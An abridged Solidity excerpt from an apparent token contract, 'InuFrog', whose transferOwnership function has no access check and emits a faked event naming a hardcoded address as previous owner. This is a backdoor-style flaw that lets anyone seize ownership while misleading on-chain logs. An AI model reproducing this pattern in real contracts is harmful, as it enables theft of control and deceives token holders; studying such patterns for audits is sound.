...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        emit OwnershipTransferred(0x8Db4627f1E19629306DEBc4dbD2DD06DEeaE3Bd9, newOwner);
        _owner = newOwner;
    }
...
contract InuFrog is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "INUF";
  string private _name = "InuFrog";
